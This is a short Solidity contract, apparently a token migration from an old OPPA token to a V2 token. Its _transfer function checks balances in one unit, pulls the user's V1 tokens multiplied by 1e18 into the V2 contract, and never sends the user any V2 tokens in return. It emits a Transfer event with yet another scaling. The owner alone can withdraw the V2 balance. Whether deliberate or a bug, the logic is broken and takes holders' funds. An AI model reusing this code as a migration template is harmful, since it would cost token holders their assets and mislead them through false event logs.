contract OppaMigration {
    IOPPA _oppa;
    using SafeMath for uint256;

    OPPAToken public tokenV2;
    address public owner;

    uint256 public availableToken;

    event Transfer(address _address, uint256 _amount);

    constructor() {
        owner = msg.sender;

        _oppa = IOPPA(0x3bE1D578b93c18944Dfa668C38841e560f517b65);
    }

    function initialise(OPPAToken _tokenV2, uint256 _availabletoken)
        public
        onlyOwner
    {
        tokenV2 = _tokenV2;
        availableToken = _availabletoken;
    }

    function _transfer(uint256 _amount) external {
        require(availableToken >= _amount, "No available token");
        require(
            OPPAToken(tokenV2).balanceOf(address(this)) >= _amount,
            "Not enough contract balance"
        );
        require(
            _oppa.balanceOf(msg.sender) >= _amount,
            "Sender balance not enough"
        );

        _oppa.transferFrom(msg.sender, address(tokenV2), _amount * 1e18);
        emit Transfer(msg.sender, _amount * 1e9);
    }

    function WithdrawToken(uint256 _amount) external onlyOwner {
        OPPAToken(tokenV2).transfer(msg.sender, _amount);
    }

    function transferOwnership(address _owner) public {
        require(msg.sender == owner);
        owner = _owner;
    }

    function getV1Balance(address _account) external view returns (uint256) {
        return _oppa.balanceOf(_account);
    }

    modifier onlyOwner() {
        require(msg.sender == owner);
        _;
    }
}

